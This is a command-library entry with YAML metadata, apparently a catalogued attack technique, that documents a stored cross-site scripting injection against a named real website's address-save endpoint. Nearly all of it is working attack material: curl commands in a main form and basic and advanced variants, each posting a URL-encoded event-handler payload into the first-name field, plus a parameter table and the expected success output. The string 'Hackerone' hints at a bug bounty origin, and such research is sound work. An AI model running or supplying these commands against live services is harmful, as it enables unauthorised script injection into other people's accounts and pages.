---
data: >-
  curl -X POST 'https://www.starbucks.com/account/profile/AddressSave' -H
  'Cookie: your-session-cookie-here' -d
  'Address.FirstName=z%22%20onmouseover%3D%22alert(%27Hackerone%27)%22%20style%3D%22position%3Afixed%3Bleft%3A0%3Btop%3A0%3Bwidth%3A9999px%3Bheight%3A9999px%3B%22%3E'
  -d 'Address.LastName=Test' -d 'Address.Street=123 Test St'
tags:
  - xss
  - http
  - post
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 52579715-b9ba-4e75-8d3b-d0bbfdb41644
created_at: '2025-12-14T03:16:37.331Z'
updated_at: '2025-12-14T03:16:37.331Z'
verified: false
validated: true
submitted: true
---
# curl-post-starbucks-address-xss

## Command

```bash
curl -X POST 'https://www.starbucks.com/account/profile/AddressSave' \
  -H 'Cookie: your-session-cookie-here' \
  -d 'Address.FirstName=z%22%20onmouseover%3D%22alert(%27Hackerone%27)%22%20style%3D%22position%3Afixed%3Bleft%3A0%3Btop%3A0%3Bwidth%3A9999px%3Bheight%3A9999px%3B%22%3E' \
  -d 'Address.LastName=Test' \
  -d 'Address.Street=123 Test St'
```

## Description

This command sends a POST request to Starbucks' AddressSave endpoint to inject a stored XSS payload into the Address.FirstName field, using curl for HTTP interaction. It requires authentication via cookies and URL-encoded data to bypass filtering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| URL | Target endpoint for address save | Yes |
| `-H 'Cookie: ...'` | Authentication session cookie | Yes |
| `-d 'Address.FirstName=...'` | Payload in FirstName (URL-encoded XSS) | Yes |
| `-d 'other fields'` | Additional form data like LastName, Street | Yes (as per form) |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.starbucks.com/account/profile/AddressSave' -H 'Cookie: sbux_session=abc123' -d 'Address.FirstName=z%22%20onmouseover%3D%22alert(1)%22%3E'
```

### Advanced Usage

```bash
curl -X POST 'https://www.starbucks.com/account/profile/AddressSave' \
  -H 'Cookie: sbux_session=abc123' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'Address.FirstName=z%22%20onmouseover%3D%22alert(%27XSS%27)%22%20style%3D%22position%3Afixed%3Bz-index%3A9999%3B%22%3E' \
  -d 'Address.City=TestCity' \
  -d 'Address.Zip=12345' \
  --verbose
```

## Expected Output

HTTP 200 OK or 302 redirect to profile, with response body indicating successful save (e.g., JSON success or HTML redirect). No error for invalid chars due to poor sanitization.

## Related

- [[Related Procedure: Inject-Stored-XSS-in-Address-FirstName]]
